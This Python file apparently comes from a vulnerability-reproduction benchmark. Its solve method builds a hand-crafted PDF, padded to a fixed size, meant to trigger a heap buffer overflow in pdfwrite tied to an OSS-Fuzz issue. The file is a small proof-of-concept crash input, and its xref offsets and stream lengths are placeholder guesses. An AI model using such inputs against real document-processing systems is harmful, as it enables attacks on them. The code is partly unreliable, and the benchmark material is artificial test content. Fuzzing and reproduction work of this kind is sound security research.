import os
import subprocess
import tempfile
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PDF that triggers the heap buffer overflow vulnerability
        # in pdfwrite by causing a viewer state restore when depth is 0
        
        # This creates a minimal PDF that should trigger the vulnerability
        # based on the description of OSS-Fuzz issue 42535696
        
        pdf_content = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 100
>>
stream
q 0 0 612 792 re W n
0 0 0 rg
0 0 0 RG
1 w
0 J
0 j
10 M
[]0 d
BI
/Width 1
/Height 1
/BitsPerComponent 8
/Decode [0 1]
ID
\x00
EI
Q
endstream
endobj

5 0 obj
<<
/Type /XObject
/Subtype /Form
/BBox [0 0 100 100]
/Matrix [1 0 0 1 0 0]
/Length 50
>>
stream
q 1 0 0 1 0 0 cm
q
Q
Q
endstream
endobj

6 0 obj
<<
/Type /Pattern
/PatternType 1
/PaintType 1
/TilingType 1
/BBox [0 0 100 100]
/XStep 100
/YStep 100
/Resources <<
/XObject <<
/Fm0 5 0 R
>>
>>
/Length 60
>>
stream
/Fm0 Do
q
0 0 0 rg
0 0 m
100 0 l
100 100 l
0 100 l
f
Q
endstream
endobj

7 0 obj
<<
/Type /ExtGState
/CA 1
/ca 1
>>
endobj

8 0 obj
<<
/Type /ExtGState
/CA 0.5
/ca 0.5
/BM /Normal
>>
endobj

9 0 obj
[
/PDF
/Text
]
endobj

10 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj

11 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 12 0 R
/Resources <<
/Pattern <<
/P1 6 0 R
>>
/ExtGState <<
/GS1 7 0 R
/GS2 8 0 R
>>
/Font <<
/F1 10 0 R
>>
>>
>>
endobj

12 0 obj
<<
/Length 200
>>
stream
q
/GS1 gs
/P1 cs
/P1 scn
0 0 612 792 re
f
Q
q
/GS2 gs
BT
/F1 12 Tf
100 100 Td
(Triggering vulnerability) Tj
ET
Q
q
0 0 0 rg
BT
/F1 10 Tf
50 50 Td
(Restoring viewer state with depth 0) Tj
ET
Q
endstream
endobj

13 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/ViewerPreferences <<
/HideToolbar false
/HideMenubar false
/HideWindowUI false
/FitWindow false
/CenterWindow false
/DisplayDocTitle false
>>
/PageMode /UseNone
/PageLayout /SinglePage
/OpenAction [3 0 R /Fit]
>>
endobj

xref
0 14
0000000000 65535 f
0000000010 00000 n
0000000050 00000 n
0000000120 00000 n
0000000220 00000 n
0000000350 00000 n
0000000450 00000 n
0000000550 00000 n
0000000620 00000 n
0000000670 00000 n
0000000720 00000 n
0000000820 00000 n
0000001020 00000 n
0000001250 00000 n

trailer
<<
/Size 14
/Root 13 0 R
>>
startxref
1400
%%EOF"""

        # Add random data to reach the target size while maintaining PDF structure
        target_size = 150979
        current_size = len(pdf_content)
        
        if current_size < target_size:
            # Insert padding in a way that doesn't break the PDF structure
            # We'll add comments before the EOF
            padding_size = target_size - current_size
            padding = b"\n" + b"%" + b"A" * (padding_size - 2) + b"\n"
            
            # Split the PDF and insert padding before %%EOF
            parts = pdf_content.split(b"%%EOF")
            if len(parts) == 2:
                pdf_content = parts[0] + padding + b"%%EOF"
        
        return pdf_content[:target_size]